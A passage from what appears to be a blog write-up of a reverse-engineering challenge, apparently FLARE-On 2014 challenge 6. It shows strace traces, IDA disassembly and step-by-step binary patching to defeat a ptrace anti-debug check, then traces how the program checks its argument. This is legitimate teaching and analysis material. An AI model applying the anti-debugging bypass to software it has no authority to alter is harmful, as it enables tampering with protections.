brk<span style="color: #719e07">(</span>0x18cc1c0<span style="color: #719e07">)</span>                          <span style="color: #719e07">=</span> 0x18cc1c0
arch_prctl<span style="color: #719e07">(</span>ARCH_SET_FS, 0x18cb880<span style="color: #719e07">)</span>      <span style="color: #719e07">=</span> 0
brk<span style="color: #719e07">(</span>0x18ed1c0<span style="color: #719e07">)</span>                          <span style="color: #719e07">=</span> 0x18ed1c0
brk<span style="color: #719e07">(</span>0x18ee000<span style="color: #719e07">)</span>                          <span style="color: #719e07">=</span> 0x18ee000
fstat<span style="color: #719e07">(</span>1, <span style="color: #719e07">{</span><span style="color: #268BD2">st_mode</span><span style="color: #719e07">=</span>S_IFCHR<span style="color: #93A1A1">|</span>0620, <span style="color: #268BD2">st_rdev</span><span style="color: #719e07">=</span>makedev<span style="color: #719e07">(</span>136, 0<span style="color: #719e07">)</span>, ...<span style="color: #719e07">})</span> <span style="color: #719e07">=</span> 0
mmap<span style="color: #719e07">(</span>NULL, 4096, PROT_READ<span style="color: #93A1A1">|</span>PROT_WRITE, MAP_PRIVATE<span style="color: #93A1A1">|</span>MAP_ANONYMOUS, -1, 0<span style="color: #719e07">)</span> <span style="color: #719e07">=</span> 0x7ffd41ca2000
write<span style="color: #719e07">(</span>1, <span style="color: #2AA198">&quot;na\n&quot;</span>, 3na
<span style="color: #719e07">)</span>                     <span style="color: #719e07">=</span> 3
exit_group<span style="color: #719e07">(</span>423<span style="color: #719e07">)</span>                         <span style="color: #719e07">=</span> ?

$ strace ./e7bc5d2c0cf4480348f5504196561297 arg1 arg2
execve<span style="color: #719e07">(</span><span style="color: #2AA198">&quot;./e7bc5d2c0cf4480348f5504196561297&quot;</span>, <span style="color: #719e07">[</span><span style="color: #2AA198">&quot;./e7bc5d2c0cf4480348f55041965612&quot;</span>..., <span style="color: #2AA198">&quot;arg1&quot;</span>, <span style="color: #2AA198">&quot;arg2&quot;</span><span style="color: #719e07">]</span>, <span style="color: #719e07">[</span>/* <span style="color: #2AA198">31</span> vars */<span style="color: #719e07">])</span> <span style="color: #719e07">=</span> 0
uname<span style="color: #719e07">({</span><span style="color: #268BD2">sys</span><span style="color: #719e07">=</span><span style="color: #2AA198">&quot;Linux&quot;</span>, <span style="color: #268BD2">node</span><span style="color: #719e07">=</span><span style="color: #2AA198">&quot;kali&quot;</span>, ...<span style="color: #719e07">})</span>  <span style="color: #719e07">=</span> 0
brk<span style="color: #719e07">(</span>0<span style="color: #719e07">)</span>                                  <span style="color: #719e07">=</span> 0x128d000
brk<span style="color: #719e07">(</span>0x128e1c0<span style="color: #719e07">)</span>                          <span style="color: #719e07">=</span> 0x128e1c0
arch_prctl<span style="color: #719e07">(</span>ARCH_SET_FS, 0x128d880<span style="color: #719e07">)</span>      <span style="color: #719e07">=</span> 0
brk<span style="color: #719e07">(</span>0x12af1c0<span style="color: #719e07">)</span>                          <span style="color: #719e07">=</span> 0x12af1c0
brk<span style="color: #719e07">(</span>0x12b0000<span style="color: #719e07">)</span>                          <span style="color: #719e07">=</span> 0x12b0000
ptrace<span style="color: #719e07">(</span>PTRACE_TRACEME, 0, 0x1, 0<span style="color: #719e07">)</span>       <span style="color: #719e07">=</span> -1 EPERM <span style="color: #719e07">(</span>Operation not permitted<span style="color: #719e07">)</span>
fstat<span style="color: #719e07">(</span>1, <span style="color: #719e07">{</span><span style="color: #268BD2">st_mode</span><span style="color: #719e07">=</span>S_IFCHR<span style="color: #93A1A1">|</span>0620, <span style="color: #268BD2">st_rdev</span><span style="color: #719e07">=</span>makedev<span style="color: #719e07">(</span>136, 0<span style="color: #719e07">)</span>, ...<span style="color: #719e07">})</span> <span style="color: #719e07">=</span> 0
mmap<span style="color: #719e07">(</span>NULL, 4096, PROT_READ<span style="color: #93A1A1">|</span>PROT_WRITE, MAP_PRIVATE<span style="color: #93A1A1">|</span>MAP_ANONYMOUS, -1, 0<span style="color: #719e07">)</span> <span style="color: #719e07">=</span> 0x7fba3fee7000
write<span style="color: #719e07">(</span>1, <span style="color: #2AA198">&quot;Program received signal SIGSEGV,&quot;</span>..., 52Program received signal SIGSEGV, Segmentation fault<span style="color: #719e07">)</span> <span style="color: #719e07">=</span> 52
exit_group<span style="color: #719e07">(</span>9001<span style="color: #719e07">)</span>                        <span style="color: #719e07">=</span> ?
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>Syscalls are similar in all traces except with two arguments. We can see that <code>ptrace</code> is being called in line 37. It&rsquo;s a common <a href="http://reverseengineering.stackexchange.com/a/1931" target="_blank">anti-debug protection</a> in Linux. &ldquo;[a]n executable can only call ptrace once. if ptrace() was already called by the strace executable, we can detect it in runtime.&rdquo; So we need to bypass <code>ptrace</code>. Searching for <code>ptrace</code> in IDA does not turn up anything. I learned that syscalls are not called that way by name (he he). The argument for <code>syscall</code> is moved to <code>eax</code> and then it is called. So I search for the text <code>syscall</code> in IDA and then commented each call according to <a href="http://blog.rchapman.org/post/36801038863/linux-system-call-table-for-x86-64" target="_blank">Linux System Call Table for x86_64</a> by <code>@pixnbits</code>. <code>ptrace</code> is <code>0x65</code>:</p>

<p><img src="/images/2014/flare/6-1.jpg" alt="ptrace call" title="ptrace call" /></p>

<p>Later I realized there was a much easier way to find it instead of discovering all calls. Running <code>strace</code> with <code>-i</code> switch will print the instruction pointer <del>at the time of call</del> after the syscall returns. Let&rsquo;s run <code>ptrace</code> on the binary with two arguments with this new swtich and look at the results.</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>strace -i</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%">$ strace -i ./e7bc5d2c0cf4480348f5504196561297 arg1 arg2
<span style="color: #719e07">[</span>    7f87e90646e7<span style="color: #719e07">]</span> execve<span style="color: #719e07">(</span><span style="color: #2AA198">&quot;./e7bc5d2c0cf4480348f5504196561297&quot;</span>, <span style="color: #719e07">[</span><span style="color: #2AA198">&quot;./e7bc5d2c0cf4480348f55041965612&quot;</span>..., <span style="color: #2AA198">&quot;arg1&quot;</span>, <span style="color: #2AA198">&quot;arg2&quot;</span><span style="color: #719e07">]</span>, <span style="color: #719e07">[</span>/* <span style="color: #2AA198">31</span> vars */<span style="color: #719e07">])</span> <span style="color: #719e07">=</span> 0
<span style="color: #719e07">[</span>          4a9297<span style="color: #719e07">]</span> uname<span style="color: #719e07">({</span><span style="color: #268BD2">sys</span><span style="color: #719e07">=</span><span style="color: #2AA198">&quot;Linux&quot;</span>, <span style="color: #268BD2">node</span><span style="color: #719e07">=</span><span style="color: #2AA198">&quot;kali&quot;</span>, ...<span style="color: #719e07">})</span> <span style="color: #719e07">=</span> 0
<span style="color: #719e07">[</span>          4aa78a<span style="color: #719e07">]</span> brk<span style="color: #719e07">(</span>0<span style="color: #719e07">)</span>               <span style="color: #719e07">=</span> 0x1212000
<span style="color: #719e07">[</span>          4aa78a<span style="color: #719e07">]</span> brk<span style="color: #719e07">(</span>0x12131c0<span style="color: #719e07">)</span>       <span style="color: #719e07">=</span> 0x12131c0
<span style="color: #719e07">[</span>          45e3f5<span style="color: #719e07">]</span> arch_prctl<span style="color: #719e07">(</span>ARCH_SET_FS, 0x1212880<span style="color: #719e07">)</span> <span style="color: #719e07">=</span> 0
<span style="color: #719e07">[</span>          4aa78a<span style="color: #719e07">]</span> brk<span style="color: #719e07">(</span>0x12341c0<span style="color: #719e07">)</span>       <span style="color: #719e07">=</span> 0x12341c0
<span style="color: #719e07">[</span>          4aa78a<span style="color: #719e07">]</span> brk<span style="color: #719e07">(</span>0x1235000<span style="color: #719e07">)</span>       <span style="color: #719e07">=</span> 0x1235000
<span style="color: #719e07">[</span>          47431b<span style="color: #719e07">]</span> ptrace<span style="color: #719e07">(</span>PTRACE_TRACEME, 0, 0x1, 0<span style="color: #719e07">)</span> <span style="color: #719e07">=</span> -1 EPERM <span style="color: #719e07">(</span>Operation not permitted<span style="color: #719e07">)</span>
<span style="color: #719e07">[</span>          473e44<span style="color: #719e07">]</span> fstat<span style="color: #719e07">(</span>1, <span style="color: #719e07">{</span><span style="color: #268BD2">st_mode</span><span style="color: #719e07">=</span>S_IFCHR<span style="color: #93A1A1">|</span>0620, <span style="color: #268BD2">st_rdev</span><span style="color: #719e07">=</span>makedev<span style="color: #719e07">(</span>136, 0<span style="color: #719e07">)</span>, ...<span style="color: #719e07">})</span> <span style="color: #719e07">=</span> 0
<span style="color: #719e07">[</span>          47509a<span style="color: #719e07">]</span> mmap<span style="color: #719e07">(</span>NULL, 4096, PROT_READ<span style="color: #93A1A1">|</span>PROT_WRITE, MAP_PRIVATE<span style="color: #93A1A1">|</span>MAP_ANONYMOUS, -1, 0<span style="color: #719e07">)</span> <span style="color: #719e07">=</span> 0x7f617785f000
<span style="color: #719e07">[</span>          473f50<span style="color: #719e07">]</span> write<span style="color: #719e07">(</span>1, <span style="color: #2AA198">&quot;Program received signal SIGSEGV,&quot;</span>..., 52Program received signal SIGSEGV, Segmentation fault<span style="color: #719e07">)</span> <span style="color: #719e07">=</span> 52
<span style="color: #719e07">[</span>          473dd8<span style="color: #719e07">]</span> exit_group<span style="color: #719e07">(</span>9001<span style="color: #719e07">)</span>     <span style="color: #719e07">=</span> ?
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>Look at IP at the time of <code>ptrace</code> in line 9: <code>47431b</code>. Now look at the IDA screenshot above.</p>

<p>So this function calls <code>ptrace</code>. To find out where this function is being called, highlight it and press <code>x</code> in IDA. There is only one call.</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>bypassing ptrace</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">.text:000000000041</span><span style="color: #268BD2">F1F8</span> <span style="color: #268BD2">B9</span> <span style="color: #2AA198">00</span> <span style="color: #2AA198">00</span> <span style="color: #2AA198">00</span>    <span style="color: #268BD2">mov</span>     <span style="color: #B58900">ecx</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">0</span>
<span style="color: #93A1A1">.text:000000000041</span><span style="color: #268BD2">F1FD</span> <span style="color: #268BD2">BA</span> <span style="color: #2AA198">01</span> <span style="color: #2AA198">00</span> <span style="color: #2AA198">00</span>    <span style="color: #268BD2">mov</span>     <span style="color: #B58900">edx</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">1</span>
<span style="color: #93A1A1">.text:000000000041</span><span style="color: #268BD2">F202</span> <span style="color: #268BD2">BE</span> <span style="color: #2AA198">00</span> <span style="color: #2AA198">00</span> <span style="color: #2AA198">00</span>    <span style="color: #268BD2">mov</span>     <span style="color: #B58900">esi</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">0</span>
<span style="color: #93A1A1">.text:000000000041</span><span style="color: #268BD2">F207</span> <span style="color: #268BD2">BF</span> <span style="color: #2AA198">00</span> <span style="color: #2AA198">00</span> <span style="color: #2AA198">00</span>    <span style="color: #268BD2">mov</span>     <span style="color: #B58900">edi</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">0</span>
<span style="color: #93A1A1">.text:000000000041</span><span style="color: #268BD2">F20C</span> <span style="color: #268BD2">B8</span> <span style="color: #2AA198">00</span> <span style="color: #2AA198">00</span> <span style="color: #2AA198">00</span>    <span style="color: #268BD2">mov</span>     <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">0</span>
<span style="color: #93A1A1">.text:000000000041</span><span style="color: #268BD2">F211</span> <span style="color: #268BD2">E8</span> <span style="color: #2AA198">9</span><span style="color: #268BD2">A</span> <span style="color: #2AA198">50</span> <span style="color: #2AA198">05</span>    <span style="color: #268BD2">call</span>    <span style="color: #268BD2">calls_ptrace</span>
<span style="color: #93A1A1">.text:000000000041</span><span style="color: #268BD2">F216</span> <span style="color: #2AA198">48</span> <span style="color: #268BD2">C1</span> <span style="color: #268BD2">E8</span> <span style="color: #2AA198">3</span><span style="color: #268BD2">F</span>    <span style="color: #268BD2">shr</span>     <span style="color: #B58900">rax</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">3Fh</span>
<span style="color: #93A1A1">.text:000000000041</span><span style="color: #268BD2">F21A</span> <span style="color: #2AA198">84</span> <span style="color: #268BD2">C0</span>          <span style="color: #268BD2">test</span>    <span style="color: #B58900">al</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">al</span>     <span style="color: #586E75">; if ptrace return value is zero jump to bypass_ptrace</span>
<span style="color: #93A1A1">.text:000000000041</span><span style="color: #268BD2">F21C</span> <span style="color: #2AA198">74</span> <span style="color: #2AA198">14</span>          <span style="color: #268BD2">jz</span>      <span style="color: #268BD2">short</span> <span style="color: #268BD2">bypass_ptrace</span>

<span style="color: #93A1A1">.text:000000000041</span><span style="color: #268BD2">F21E</span> <span style="color: #268BD2">BF</span> <span style="color: #2AA198">50</span> <span style="color: #2AA198">3</span><span style="color: #268BD2">B</span> <span style="color: #2AA198">4</span><span style="color: #268BD2">F</span>    <span style="color: #268BD2">mov</span>     <span style="color: #B58900">edi</span><span style="color: #93A1A1">,</span> <span style="color: #268BD2">offset</span> <span style="color: #268BD2">aProgramReceive</span> <span style="color: #586E75">; &quot;Program received signal SIGSEGV, Segmentation fault&quot;</span>
<span style="color: #93A1A1">.text:000000000041</span><span style="color: #268BD2">F223</span> <span style="color: #268BD2">E8</span> <span style="color: #268BD2">B8</span> <span style="color: #268BD2">F9</span> <span style="color: #2AA198">03</span>    <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sys_write_call</span>
<span style="color: #93A1A1">.text:000000000041</span><span style="color: #268BD2">F228</span> <span style="color: #268BD2">BF</span> <span style="color: #2AA198">29</span> <span style="color: #2AA198">23</span> <span style="color: #2AA198">00</span>    <span style="color: #268BD2">mov</span>     <span style="color: #B58900">edi</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">2329h</span>
<span style="color: #93A1A1">.text:000000000041</span><span style="color: #268BD2">F22D</span> <span style="color: #268BD2">E8</span> <span style="color: #2AA198">5</span><span style="color: #268BD2">E</span> <span style="color: #268BD2">F5</span> <span style="color: #2AA198">03</span>    <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_45E790</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>Return value from <code>ptrace</code> is manipulated and then checked to see if it is zero. If non-zero, the program continues to line 11 and prints the segfault message in line 12 (I have renamed it). As you have noticed I have enabled opcodes in the last code snippet. In IDA go to the <code>Option</code> menu and then <code>General</code>. Change the <code>number of opcode bytes</code>.</p>

<p>To patch the binary to bypass ptrace we need to change the <code>jz</code> instruction in line 9 to <code>jmp</code>. In this short jump <code>0x74</code> stands for <code>jnz</code> and <code>0x14</code> means thee number of bytes to jump (in this case 14 bytes ahead). To patch it to <code>jmp</code>, change <code>0x74</code> to <code>0xEB</code>. Open the binary in a hex editor (e.g. Bless). Now we need to find this offset. I do what I call <code>lazy patching</code>. Search for opcodes for the last few instructions before and <code>jnz</code> in hex editor. In this case we are looking for <code>48 C1 E8 3F 84 C0 74 14</code>. There is probably only one place in the binary with this sequence of bytes. Find it and change <code>0x74</code> to <code>0xEB</code>. Now we have bypassed <code>ptrace</code>. Another alternative is to replace the <code>call calls_ptrace</code> in line 6 with NOPs. NOP is short for No Operation and has the opcode <code>0x90</code>. It actually stands for <code>xchg eax, eax</code>. Both of them work.</p>

<p>So I bypassed <code>ptrace</code>. There were a lot of calculations. Random strings were loaded and manipulated. After stepping around the code in IDA I gave up. At this point I had two leads:</p>

<ol>
<li>The binary prints <code>no</code>. Put breakpoints on all <code>sys_write</code> calls and trace the print back</li>
<li>The application needs to manipulate the arguments somehow. Search for <a href="http://www.csc.depauw.edu/~bhoward/asmtut/asmtut7.html" target="_blank">string instructions</a>, breakpoint them and see if  we hit one</li>
</ol>

<p>I chose option 2, searched for string instructions and assigned breakpoints. After running the program I hit a <code>repne scasb</code>.</p>

<p>What does <code>repne scasb</code> do?<br />
<code>repne scasb</code> will scan the string in <code>di/edi/rdi</code> for the byte (<code>scasb</code> is the byte version of <code>scas</code> instruction) in <code>ax/eax/rax</code> and decrease <code>cx/ecx/rcx</code> by one after each execution. It stops if <code>cx/ecx/rcx</code> reaches zero or if a match is found.</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>strlen</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">.text:00000000004370</span><span style="color: #268BD2">CF</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">rax</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">rbp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_3C0</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:00000000004370</span><span style="color: #268BD2">D6</span> <span style="color: #268BD2">add</span>     <span style="color: #B58900">rax</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">8</span>
<span style="color: #93A1A1">.text:00000000004370</span><span style="color: #268BD2">DA</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">rax</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">rax</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:00000000004370</span><span style="color: #268BD2">DD</span> <span style="color: #268BD2">mov</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">rbp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_3C8</span><span style="color: #93A1A1">],</span> <span style="color: #2AA198">0FFFFFFFFFFFFFFFFh</span>
<span style="color: #93A1A1">.text:00000000004370</span><span style="color: #268BD2">E8</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">rdx</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">rax</span>
<span style="color: #93A1A1">.text:00000000004370</span><span style="color: #268BD2">EB</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">0</span>          <span style="color: #586E75">; null terminator</span>
<span style="color: #93A1A1">.text:00000000004370</span><span style="color: #268BD2">F0</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">rcx</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">rbp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_3C8</span><span style="color: #93A1A1">]</span>   <span style="color: #586E75">; 0FFFFFFFFFFFFFFFFh</span>
<span style="color: #93A1A1">.text:00000000004370</span><span style="color: #268BD2">F7</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">rdi</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">rdx</span>        <span style="color: #586E75">; rdi = arg1</span>
<span style="color: #93A1A1">.text:00000000004370</span><span style="color: #268BD2">FA</span> <span style="color: #268BD2">repne</span> <span style="color: #268BD2">scasb</span>             <span style="color: #586E75">; searching for null terminator</span>
<span style="color: #93A1A1">.text:00000000004370</span><span style="color: #268BD2">FA</span>                         <span style="color: #586E75">; in other words strlen</span>
<span style="color: #93A1A1">.text:00000000004370</span><span style="color: #268BD2">FC</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">rax</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">rcx</span>
<span style="color: #93A1A1">.text:00000000004370</span><span style="color: #268BD2">FF</span> <span style="color: #268BD2">not</span>     <span style="color: #B58900">rax</span>
<span style="color: #93A1A1">.text:0000000000437102</span> <span style="color: #268BD2">sub</span>     <span style="color: #B58900">rax</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">1</span>
<span style="color: #93A1A1">.text:0000000000437106</span> <span style="color: #268BD2">cmp</span>     <span style="color: #B58900">rax</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">0Ah</span>        <span style="color: #586E75">; if ( strlen(arg1) == 10 ) jump</span>
<span style="color: #93A1A1">.text:000000000043710</span><span style="color: #268BD2">A</span> <span style="color: #268BD2">jz</span>      <span style="color: #268BD2">short</span> <span style="color: #268BD2">strlen_arg1_equals_10</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>Null terminator or <code>0x00</code> is saved in eax in line 6. Line 7 has <code>rcx</code>. We don&rsquo;t want <code>rcx</code> to reach zero before the end of the string. First argument is saved in <code>rdi</code> in line 8 and finally line 9 calls <code>repne scasb</code>. This is basically <code>strlen(arg1)</code>. In line 14, it is checked if the length of first argument is 10. If so we will jump.</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>strlen_arg1_equals_10</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2
3
4
5
6
7
8
9</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">.text:0000000000437120</span> <span style="color: #93A1A1">strlen_arg1_equals_10:</span>  <span style="color: #586E75">; strlen(arg1) == 10 Decimal</span>
<span style="color: #93A1A1">.text:0000000000437120</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">rax</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">rbp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_3C0</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:0000000000437127</span> <span style="color: #268BD2">add</span>     <span style="color: #B58900">rax</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">8</span>
<span style="color: #93A1A1">.text:000000000043712</span><span style="color: #268BD2">B</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">rax</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">rax</span><span style="color: #93A1A1">]</span>           <span style="color: #586E75">; rax = arg1</span>
<span style="color: #93A1A1">.text:000000000043712</span><span style="color: #268BD2">E</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">rdi</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">rax</span>             <span style="color: #586E75">; rdi = arg1</span>
<span style="color: #93A1A1">.text:0000000000437131</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_468BB0</span>
<span style="color: #93A1A1">.text:0000000000437136</span> <span style="color: #268BD2">mov</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">rbp</span><span style="color: #719e07">+</span><span style="color: #268BD2">arg1_2</span><span style="color: #93A1A1">],</span> <span style="color: #B58900">rax</span>    <span style="color: #586E75">; rax = arg1</span>
<span style="color: #93A1A1">.text:000000000043713</span><span style="color: #268BD2">D</span> <span style="color: #268BD2">mov</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">rbp</span><span style="color: #719e07">+</span><span style="color: #268BD2">counter_?</span><span style="color: #93A1A1">],</span> <span style="color: #2AA198">0</span>
<span style="color: #93A1A1">.text:0000000000437147</span> <span style="color: #268BD2">jmp</span>     <span style="color: #268BD2">short</span> <span style="color: #268BD2">loc_437177</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>We can see that arg1 is saved to <code>rdi</code> in line 5 and <code>sub_468BB0</code> is called. We can get inside <code>sub_468BB0</code> but it is basically <code>malloc</code>. It allocates a string and initializes it with first argument. Return value is in <code>rax</code> which is a pointer to the newly created string. It is saved to <code>[rbp+arg1_2]</code> (I have renamed the variables). Finally there is an unconditional jump.</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>loc_437177</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">.text:0000000000437177</span> <span style="color: #93A1A1">loc_437177:</span>
<span style="color: #93A1A1">.text:0000000000437177</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">rbp</span><span style="color: #719e07">+</span><span style="color: #268BD2">counter_?</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:000000000043717</span><span style="color: #268BD2">D</span> <span style="color: #268BD2">movsxd</span>  <span style="color: #B58900">rsi</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">eax</span>
<span style="color: #93A1A1">.text:0000000000437180</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">rax</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">rbp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_3C0</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:0000000000437187</span> <span style="color: #268BD2">add</span>     <span style="color: #B58900">rax</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">8</span>
<span style="color: #93A1A1">.text:000000000043718</span><span style="color: #268BD2">B</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">rax</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">rax</span><span style="color: #93A1A1">]</span>       <span style="color: #586E75">; rax = arg1</span>
<span style="color: #93A1A1">.text:000000000043718</span><span style="color: #268BD2">E</span> <span style="color: #268BD2">mov</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">rbp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_3C8</span><span style="color: #93A1A1">],</span> <span style="color: #2AA198">0FFFFFFFFFFFFFFFFh</span>
<span style="color: #93A1A1">.text:0000000000437199</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">rdx</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">rax</span>
<span style="color: #93A1A1">.text:000000000043719</span><span style="color: #268BD2">C</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">0</span>
<span style="color: #93A1A1">.text:00000000004371</span><span style="color: #268BD2">A1</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">rcx</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">rbp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_3C8</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:00000000004371</span><span style="color: #268BD2">A8</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">rdi</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">rdx</span>        <span style="color: #586E75">; rdi = arg1</span>
<span style="color: #93A1A1">.text:00000000004371</span><span style="color: #268BD2">AB</span> <span style="color: #268BD2">repne</span> <span style="color: #268BD2">scasb</span>             <span style="color: #586E75">; strlen(arg1)</span>
<span style="color: #93A1A1">.text:00000000004371</span><span style="color: #268BD2">AD</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">rax</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">rcx</span>
<span style="color: #93A1A1">.text:00000000004371</span><span style="color: #268BD2">B0</span> <span style="color: #268BD2">not</span>     <span style="color: #B58900">rax</span>
<span style="color: #93A1A1">.text:00000000004371</span><span style="color: #268BD2">B3</span> <span style="color: #268BD2">sub</span>     <span style="color: #B58900">rax</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">1</span>
<span style="color: #93A1A1">.text:00000000004371</span><span style="color: #268BD2">B7</span> <span style="color: #268BD2">cmp</span>     <span style="color: #B58900">rsi</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">rax</span>        <span style="color: #586E75">; check if counter &lt; 11</span>
<span style="color: #93A1A1">.text:00000000004371</span><span style="color: #268BD2">BA</span> <span style="color: #268BD2">setb</span>    <span style="color: #B58900">al</span>
<span style="color: #93A1A1">.text:00000000004371</span><span style="color: #268BD2">BD</span> <span style="color: #268BD2">test</span>    <span style="color: #B58900">al</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">al</span>
<span style="color: #93A1A1">.text:00000000004371</span><span style="color: #268BD2">BF</span> <span style="color: #268BD2">jnz</span>     <span style="color: #268BD2">short</span> <span style="color: #268BD2">arg1_xor_0x56</span> <span style="color: #586E75">; if counter &lt; 11 jump to for</span>

<span style="color: #93A1A1">.text:0000000000437149</span> <span style="color: #268BD2">for_arg1_xor_0x56</span>
<span style="color: #93A1A1">.text:0000000000437149</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">rbp</span><span style="color: #719e07">+</span><span style="color: #268BD2">counter_?</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:000000000043714</span><span style="color: #268BD2">F</span> <span style="color: #268BD2">cdqe</span>
